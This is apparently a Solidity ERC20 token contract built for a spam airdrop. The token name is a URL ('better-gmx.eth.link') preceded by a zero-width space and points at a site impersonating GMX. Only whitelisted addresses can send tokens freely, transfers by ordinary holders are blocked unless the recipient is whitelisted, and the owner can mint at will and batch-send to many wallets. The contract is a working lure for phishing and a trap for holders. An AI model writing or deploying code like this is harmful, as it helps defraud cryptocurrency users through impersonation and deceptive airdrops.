// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./Ownable.sol";

contract betterThanGmx is ERC20, Ownable(msg.sender) {
    uint8 private _decimals = 18;

    mapping(address => bool) private _whitelist;

    event AddedToWhitelist(address indexed account);
    event RemovedFromWhitelist(address indexed account);

    constructor() ERC20("\u200B better-gmx.eth.link", "better-gmx.eth.link") {
        _mint(msg.sender, 21000000 * 10 ** uint(_decimals));
        // Owner default 
        _whitelist[msg.sender] = true;
    }

    function addToWhitelist(address account) public onlyOwner {
        _whitelist[account] = true;
        emit AddedToWhitelist(account);
    }

    function removeFromWhitelist(address account) public onlyOwner {
        _whitelist[account] = false;
        emit RemovedFromWhitelist(account);
    }

    function mint(uint256 amount) public onlyOwner {
        _mint(msg.sender, amount);
    }

    function isWhitelisted(address account) public view returns (bool) {
        return _whitelist[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(isWhitelisted(msg.sender) || isWhitelisted(recipient), "Transfer not allowed");
        return super.transfer(recipient, amount);
    }

    function transferBatch(address[] memory recipients, uint256 amount) public returns (bool) {
        require(isWhitelisted(msg.sender), "Only whitelisted addresses can initiate batch transfer");
        require(amount * recipients.length <= balanceOf(msg.sender), "Insufficient balance");

        for (uint256 i = 0; i < recipients.length; i++) {
            _transfer(msg.sender, recipients[i], amount);
        }

        return true;
    }
}